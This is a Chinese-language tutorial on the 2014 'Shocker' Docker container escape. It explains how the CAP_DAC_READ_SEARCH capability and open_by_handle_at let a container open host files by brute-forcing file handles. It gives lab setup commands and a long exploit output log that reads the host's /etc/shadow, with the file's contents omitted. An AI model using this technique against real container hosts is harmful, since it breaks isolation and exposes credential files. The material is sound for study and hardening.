# Shocker漏洞

在Docker版本<1.0，存在于Docker 1.0之前的绝大多数版本。由于Docker没有默认限制`CAP_DAC_READ_SEARCH`，所以可以通过`open_by_handle_at`获得宿主机上所有文件的访问权限。

新版本Docker已经默认对`CAP_DAC_READ_SEARCH`进行了限制，可以通过在启动容器时附加`--cap-add DAC_READ_SEARCH`。

# 环境搭建

```bash
gcc -o shocker shocekr.c
docker build -t shocker .
docker run --cap-add DAC_READ_SEARCH shocker  
```

# 漏洞原理

严格的来说，这只属于错误的配置导致容器逃逸，并不是漏洞。Docker通过默认去除`CAP_DAC_READ_SEARCH`，保证容器不能访问到host上的文件系统的文件。

首先了解一下`open_by_handle_at`

## `open_by_handle_at`

调用`open_by_handle_at`需要`CAP_DAC_READ_SEARCH`Capability，该函数通过句柄获取文件描述符。

```
int open_by_handle_at(int mount_fd, struct file_handle *handle, int flags);
```

- `mount_fd`：已挂载文件系统中的任意的一个文件的文件描述符，
- `handle`：一个结构体，如下：
- `flags`：和open函数相同

### `handle`结构体

```c
struct file_handle {
    int  handle_bytes;   /* Size of f_handle [in, out] */
    int           handle_type;    /* Handle type [out] */
    unsigned char f_handle[0];    /* File identifier (sized by caller) [out] */
};
```

`file_handle`结构体是`name_to_handle_at`函数的参数，结构体中的`handle_type`和`f_handle`都由函数返回。

## 利用原理

通过`open_by_handle_at`函数获取宿主机上的文件描述符，那么需要为函数准备前两个参数：
1. host文件系统任意文件的描述符
2. host文件的file_handle

对于1，由于docker中部分文件仍然是从host上直接挂载的，例如`/etc/resolv.conf`、`/etc/hostname`、`/etc/hosts`。所以可以直接打开这些文件，获取其文件描述符。在容器中执行`mount`命令，结果如下所示，可见这三个文件是直接从host上挂载的。

```bash
$ docker run -it --rm ubuntu
root@455cdb8d5cf8:/# mount
...
/dev/sda5 on /etc/resolv.conf type ext4 (rw,relatime,errors=remount-ro)
/dev/sda5 on /etc/hostname type ext4 (rw,relatime,errors=remount-ro)
/dev/sda5 on /etc/hosts type ext4 (rw,relatime,errors=remount-ro)
...
```

对于2，需要一些背景知识支撑。

`file_handle`结构体中的`f_handle`域前4个字节恰好是对应的inodeid（注意大小端序）。而根目录`/`的`f_handle`为`02 00 00 00 00 00 00 00`。

在获取了访问`/`的权限后，可以考虑逐层爆破的方式。遍历该层文件夹下所有的文件，与需要读取的文件名进行比较，如果找到则获取其inodeid以减少爆破空间的大小。

# 利用结果

```
root@53ae937a33e9:/# ./shocker
[***] docker VMM-container breakout Po(C) 2014             [***]
[***] The tea from the 90's kicks your sekurity again.     [***]
[***] If you have pending sec consulting, I'll happily     [***]
[***] forward to my friends who drink secury-tea too!      [***]
[*] Resolving 'etc/shadow'
[*] Found snap
[*] Found usr
[*] Found proc
[*] Found flag
[*] Found tmp
[*] Found home
[*] Found .
[*] Found dev
[*] Found .dockerinit
[*] Found mnt
[*] Found sbin
[*] Found root
[*] Found bigfile
[*] Found lib64
[*] Found boot
[*] Found lost+found
[*] Found bin
[*] Found swapfile
[*] Found lib32
[*] Found run
[*] Found cdrom
[*] Found etc
[+] Match: etc ino=3145729
[*] Brute forcing remaining 32bit. This can take a while...
[*] (etc) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x01, 0x00, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00};
[*] Resolving 'shadow'
[*] Found .
[*] Found ..
[*] Found anacrontab
[*] Found .pwd.lock
[*] Found avahi
[*] Found ifplugd
[*] Found PackageKit
[*] Found bash_completion
[*] Found gtk-3.0
[*] Found xdg
[*] Found geoclue
[*] Found sysstat
[*] Found kernel
[*] Found dpkg
[*] Found rsyslog.d
[*] Found debian_version
[*] Found network
[*] Found mailcap
[*] Found mecabrc
[*] Found udev
[*] Found inputrc
[*] Found perl
[*] Found hostname
[*] Found ufw
[*] Found dnsmasq.d
[*] Found snmp
[*] Found subgid
[*] Found libblockdev
[*] Found pam.d
[*] Found UPower
[*] Found thermald
[*] Found gamemode.ini
[*] Found kerneloops.conf
[*] Found cron.d
[*] Found rsyslog.conf
[*] Found modules-load.d
[*] Found dconf
[*] Found fstab
[*] Found bluetooth
[*] Found brltty
[*] Found apparmor
[*] Found bash.bashrc
[*] Found cron.weekly
[*] Found ca-certificates.conf
[*] Found cupshelpers
[*] Found mime.types
[*] Found modprobe.d
[*] Found console-setup
[*] Found mplayer
[*] Found groff
[*] Found logrotate.d
[*] Found dbus-1
[*] Found apt
[*] Found insserv.conf.d
[*] Found rc2.d
[*] Found bash_completion.d
[*] Found shells
[*] Found openvpn
[*] Found papersize
[*] Found hdparm.conf
[*] Found environment
[*] Found legal
[*] Found profile
[*] Found sudoers
[*] Found mailcap.order
[*] Found gshadow
[*] Found qemu-ifup
[*] Found dictionaries-common
[*] Found hp
[*] Found timezone
[*] Found sgml
[*] Found grub.d
[*] Found issue.net
[*] Found speech-dispatcher
[*] Found newt
[*] Found xattr.conf
[*] Found mke2fs.conf
[*] Found X11
[*] Found shadow-
[*] Found python3.8
[*] Found qemu-ifdown
[*] Found passwd-
[*] Found security
[*] Found logcheck
[*] Found cups
[*] Found issue
[*] Found sysctl.conf
[*] Found zsh_command_not_found
[*] Found host.conf
[*] Found pam.conf
[*] Found rc0.d
[*] Found NetworkManager
[*] Found manpath.config
[*] Found networks
[*] Found subuid-
[*] Found init
[*] Found cni
[*] Found systemd
[*] Found acpi
[*] Found vulkan
[*] Found os-release
[*] Found locale.alias
[*] Found ghostscript
[*] Found vmware-caf
[*] Found group-
[*] Found hosts.deny
[*] Found adduser.conf
[*] Found magic
[*] Found e2scrub.conf
[*] Found thunderbird
[*] Found iproute2
[*] Found docker
[*] Found locale.gen
[*] Found update-manager
[*] Found mpv
[*] Found ubuntu-advantage
[*] Found fprintd.conf
[*] Found cron.monthly
[*] Found apg.conf
[*] Found printcap
[*] Found xml
[*] Found fwupd
[*] Found rc5.d
[*] Found rpc
[*] Found depmod.d
[*] Found environment.d
[*] Found login.defs
[*] Found bindresvport.blacklist
[*] Found mtools.conf
[*] Found pcmcia
[*] Found alternatives
[*] Found emacs
[*] Found rcS.d
[*] Found magic.mime
[*] Found chatscripts
[*] Found openal
[*] Found profile.d
[*] Found apparmor.d
[*] Found rmt
[*] Found resolv.conf
[*] Found python3
[*] Found mysql
[*] Found nsswitch.conf
[*] Found libpaper.d
[*] Found zsh
[*] Found sudoers.d
[*] Found gshadow-
[*] Found usb_modeswitch.conf
[*] Found hosts
[*] Found udisks2
[*] Found deluser.conf
[*] Found protocols
[*] Found gnome
[*] Found ld.so.conf
[*] Found calendar
[*] Found apm
[*] Found alsa
[*] Found nanorc
[*] Found libaudit.conf
[*] Found glvnd
[*] Found usb_modeswitch.d
[*] Found ca-certificates
[*] Found rc6.d
[*] Found polkit-1
[*] Found wgetrc
[*] Found libreoffice
[*] Found ltrace.conf
[*] Found ca-certificates.conf.dpkg-old
[*] Found pulse
[*] Found initramfs-tools
[*] Found cron.daily
[*] Found services
[*] Found ssl
[*] Found pnm2ppa.conf
[*] Found cracklib
[*] Found ethertypes
[*] Found crontab
[*] Found localtime
[*] Found tmpfiles.d
[*] Found subgid-
[*] Found ld.so.cache
[*] Found terminfo
[*] Found opt
[*] Found fonts
[*] Found mtab
[*] Found cron.hourly
[*] Found rc3.d
[*] Found rc4.d
[*] Found hosts.allow
[*] Found init.d
[*] Found shadow
[+] Match: shadow ino=3148622
[*] Brute forcing remaining 32bit. This can take a while...
[*] (shadow) Trying: 0x00000000
[*] #=8, 1, char nh[] = {0x4e, 0x0b, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Got a final handle!
[*] #=8, 1, char nh[] = {0x4e, 0x0b, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00};
[!] Win! /etc/shadow output follows:
[后续输出为了安全目的省略]
```